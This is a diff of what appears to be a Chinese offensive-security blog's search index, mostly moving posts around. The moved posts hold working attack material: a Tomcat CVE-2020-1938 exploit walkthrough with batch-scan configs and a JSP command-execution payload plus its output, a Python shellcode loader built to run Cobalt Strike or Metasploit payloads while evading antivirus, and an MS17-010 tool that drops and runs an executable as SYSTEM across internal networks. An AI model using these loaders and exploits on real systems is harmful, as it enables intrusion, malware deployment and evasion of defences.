@@ -690,8 +690,8 @@
 <h3 id="注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善"><a href="#注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善" class="headerlink" title="注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善"></a>注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善</h3><h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a><a href="#readme">Top</a></h4>]]></content>
       <categories>
         <category>工具</category>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
         <category>内网</category>
       </categories>
       <tags>
@@ -935,8 +935,8 @@
 <h3 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h3><p>暂时只支持JspShell，有空再添加其它SHELL</p>
 ]]></content>
       <categories>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1510,8 +1510,8 @@
 <h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>
 ]]></content>
       <categories>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1572,8 +1572,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <category>.NET</category>
         <category>内网</category>
         <category>源码</category>
-        <category>SQL</category>
         <category>编程</category>
+        <category>SQL</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1766,6 +1766,42 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
+    <url>/p/42879.html</url>
+    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
+<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
+<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
+<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
+<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
+<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
+<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
+<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
+<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
+<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Ladon</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
     <url>/p/40523.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p>
@@ -1802,42 +1838,6 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <tags>
         <tag>Cobalt Strike</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
-    <url>/p/42879.html</url>
-    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
-<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
-<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
-<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
-<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
-<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
-<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
-<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
-<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
-<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
-]]></content>
-      <categories>
-        <category>Ladon</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -2843,8 +2843,8 @@ Microsoft Windows 10 for 32-bit Systems 0
 <p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>Metasploit</category>
         <category>免杀</category>
+        <category>Metasploit</category>
         <category>Cobalt Strike</category>
         <category>ShellCode</category>
       </categories>
@@ -3039,148 +3039,6 @@ PortTranS.exe 8000 338
       </tags>
   </entry>
   <entry>
-    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
-    <url>/p/f3512dbc.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
-<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
-<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
-<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
-<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
-<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
-<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
-<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
-<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
-<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
-<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
-<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
-<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
-<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
-<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
-<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
-<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
-<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
-<p>ScRunHex.py</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-#calc.exe
-#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
-shellcode=bytearray(sys.argv[1].decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<pre class="brush:python;gutter:true;"></pre>
-<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
-<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
-<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
-<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
-<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
-<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
-<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
-<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
-<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
-<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
-<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
-<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
-<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
-<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-import base64
-#calc.exe
-#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
-shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
-<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
-<p>&nbsp;</p>
-<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
-<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
-<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
-<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
-<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
-<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
-<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
-<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
-<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
-<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
-<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
-<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
-<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
-<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
-<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Metasploit</category>
-        <category>免杀</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-        <tag>BypassAV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>SMB</tag>
-        <tag>MS17010</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
     <url>/p/19452dd9.html</url>
     <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
@@ -3339,6 +3197,120 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
+    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
+    <url>/p/f3512dbc.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
+<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
+<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
+<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
+<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
+<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
+<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
+<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
+<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
+<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
+<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
+<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
+<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
+<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
+<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
+<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
+<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
+<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
+<p>ScRunHex.py</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+#calc.exe
+#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
+shellcode=bytearray(sys.argv[1].decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
